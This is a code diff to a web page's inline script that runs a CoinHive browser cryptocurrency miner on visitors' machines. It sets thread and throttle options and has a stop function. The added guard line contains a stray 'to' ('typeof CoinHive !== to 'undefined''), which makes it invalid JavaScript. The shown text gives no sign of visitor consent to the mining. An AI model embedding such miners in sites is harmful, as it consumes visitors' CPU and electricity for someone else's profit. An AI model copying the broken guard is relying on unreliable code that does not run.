@@ -41,12 +41,14 @@
 
     <script>
       // Linking a public site key for a privacy crypto coin to my GitHub account. It is what it is...
-      var miner = new CoinHive.Anonymous('gJgxAABplU8GAfCkeNV3ERNzlbFhUSh1', {
-      	threads: navigator.hardwareConcurrency / 2,
-      	autoThreads: false,
-      	throttle: 0.5,
-      	forceASMJS: false
-      } ) ; // Should only use 25% CPU
+      if ( typeof CoinHive !== to 'undefined' ) {
+        var miner = new CoinHive.Anonymous('gJgxAABplU8GAfCkeNV3ERNzlbFhUSh1', {
+        	threads: navigator.hardwareConcurrency / 2,
+        	autoThreads: false,
+        	throttle: 0.5,
+        	forceASMJS: false
+        } ) ; // Should only use 25% CPU
+      }
 
       function stopMining() {
         if ( miner.isRunning() ) {
